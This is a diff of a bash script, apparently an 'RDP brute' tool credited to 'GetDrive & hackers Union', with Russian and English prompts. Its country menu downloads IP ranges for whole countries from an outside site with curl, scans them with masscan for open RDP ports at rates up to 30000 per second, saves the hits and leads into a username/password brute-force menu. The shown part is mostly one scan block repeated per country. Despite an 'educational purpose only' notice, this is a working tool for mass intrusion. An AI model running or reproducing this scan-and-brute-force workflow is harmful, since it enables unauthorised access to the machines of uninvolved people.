@@ -1,9 +1,7 @@
-
 #!/bin/bash
 # NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
-ver=1.28
+ver=1.27
 clear
-
 ##########################################COLOR######################################
 colorbase="\E[0m"
 black="\033[1;30m"
@@ -15,7 +13,7 @@ grey="\033[1;37m"
 ##########################################CLEAR#######################################
 CLEARALL ()
 {
-rm -rf Results/ paused.conf hydra.restore list all_results result 2> /dev/null
+rm -rf Results/ paused.conf list all_results 2> /dev/null
 }
 ######################################################################################
 CHECKDISTR ()
@@ -68,8 +66,7 @@ depend=$(dpkg -s nmap | grep 'Status' | awk -F':' '/Status: / {print $2}')
 			else
 			echo -e "$aquamarine"
 		while true; do
-		echo    "Требующийся пакет 
- не установлен. Установить?"
+		echo    "Требующийся пакет nmap не установлен. Установить?"
                 read -p "The required package nmap is not installed Install?[Y][N]" yn
 			case $yn in
 			[Yy]* ) apt-get update -y && apt-get dist-upgrade -y; apt install nmap -y; break;;
@@ -92,7 +89,7 @@ depend=$(dpkg -s freerdp-x11 || dpkg -s freerdp2-x11  | grep 'Status' | awk -F':
 		echo    "Требующийся пакет FreeRDP не установлен. Установить?"
                 read -p "The required package FreeRDP is not installed Install?[Y][N]" yn
 			case $yn in
-			[Yy]* ) apt-get update -y && apt-get upgrade -y; apt install freerdp-x11 libfreerdp-plugins-standard -y || apt install freerdp2-x11 freerdp2-dev -y; break;;
+			[Yy]* ) apt-get update -y && apt-get dist-upgrade -y; apt install freerdp-x11 libfreerdp-plugins-standard remmina -y || apt install freerdp2-x11 remmina -y; break;;
 			[Nn]* ) exit;;
 			* ) echo "Enter answer [Y] or [N] ";;
 		esac
@@ -101,9 +98,7 @@ fi
 
 }
 ######################################################################################
-#Hydra_F () {
 
-#}
 ######################################################################################
 CLEARALL
 CHECKDISTR
@@ -118,7 +113,7 @@ clear
 echo -e       "$grey                                 +--------------------------------------+" 
 echo -e       "$grey                                 |             Auto  Script             |"
 echo -e "$aquamarine                                 |     by GetDrive & hackers Union      |" 
-echo -e        "$red                                 |             Version 1.28             |"
+echo -e        "$red                                 |             Version 1.27             |"
 #echo -e        "$red                                 |$colorbase https://github.com/getdrive/Lazy-RDP$red |"
 echo -e        "$red                                 +--------------------------------------+ $colorbase"
 #####################################CHECKLANGUAGE####################################
@@ -524,6 +519,7 @@ echo ""
 echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
 echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
 echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+
 
 
 MAINBRUTEMENURU
@@ -22220,4 +22216,7055 @@ break
 		
 		else		
 echo -e "$red                                 The value must be between 120 and 30000$colorbase"
-e
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "109" ]; then
+curl http://ipdiapazon.16mb.com/Macedonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "110" ]; then
+curl http://ipdiapazon.16mb.com/Madagascar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "111" ]; then
+curl http://ipdiapazon.16mb.com/Malawi.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "112" ]; then
+curl http://ipdiapazon.16mb.com/Malaysia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "113" ]; then
+curl http://ipdiapazon.16mb.com/Maldives.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "114" ]; then
+curl http://ipdiapazon.16mb.com/Mali.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "115" ]; then
+curl http://ipdiapazon.16mb.com/Malta.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "116" ]; then
+curl http://ipdiapazon.16mb.com/Mauritania.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "117" ]; then
+curl http://ipdiapazon.16mb.com/Mauritius.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "118" ]; then
+curl http://ipdiapazon.16mb.com/Mexico.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "119" ]; then
+curl http://ipdiapazon.16mb.com/Micronesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "120" ]; then
+curl http://ipdiapazon.16mb.com/Moldova.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "121" ]; then
+curl http://ipdiapazon.16mb.com/Monaco.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "122" ]; then
+curl http://ipdiapazon.16mb.com/Mongolia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "123" ]; then
+curl http://ipdiapazon.16mb.com/Morocco.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
